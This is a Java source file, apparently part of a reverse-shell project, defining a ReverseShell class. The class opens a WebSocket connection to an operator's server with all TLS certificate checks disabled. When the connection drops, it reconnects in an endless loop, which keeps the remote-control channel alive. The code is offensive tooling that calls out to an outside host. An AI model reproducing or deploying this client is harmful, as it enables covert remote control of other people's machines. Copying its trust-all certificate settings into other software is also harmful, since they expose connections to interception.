package com.mtattab.reverseshell.service.impl;

import com.mtattab.reverseshell.util.Constants;
import lombok.Data;
import lombok.extern.java.Log;
import org.apache.tomcat.util.bcel.classfile.Constant;
import org.eclipse.jetty.util.ssl.SslContextFactory;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
import org.eclipse.jetty.websocket.client.WebSocketClient;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;

@Data
@Log
public class ReverseShell {

    WebSocketClient client;



    String serverUriLink = Constants.LOCAL_SERVER_WEBSOCKET_URI;

    public WebSocketClient createClient(){

        // Create a custom TrustManager that trusts all certificates
        SslContextFactory.Client ssl = new SslContextFactory.Client(); // ssl config
        ssl.setEndpointIdentificationAlgorithm(null); // disable endpoint identification algorithm.
        ssl.setTrustAll(true);

        this.client = new WebSocketClient(ssl); // give ssl config to client

        return this.client;
    }


    public void startReverseShell(){
        if (!checkClient())return; // check if client is instantiated

        try {
            this.client.start();


// connect
            connectWithReconnectionSupport();




        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                client.stop();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }


    }


    private void connectWithReconnectionSupport() throws ExecutionException, InterruptedException, IOException, URISyntaxException {
        URI serverUri = new URI(this.serverUriLink); // Replace with your server URL

        while (true){
            WebSocketImpl socket = new WebSocketImpl();

            Future<Session> session = this.client.connect(socket, serverUri, new ClientUpgradeRequest());

            while (session.get().isOpen()){

            }
//            if connection is lost reconnect after 30 seconds
            Thread.sleep(3000);

        }
    }


    private boolean checkClient(){
        // check if client is instantiated
        if (this.client != null){
            log.info("Client is active");
            return true;
        }else {
            log.warning("Client is not active");
            return false;
        }
    }



}
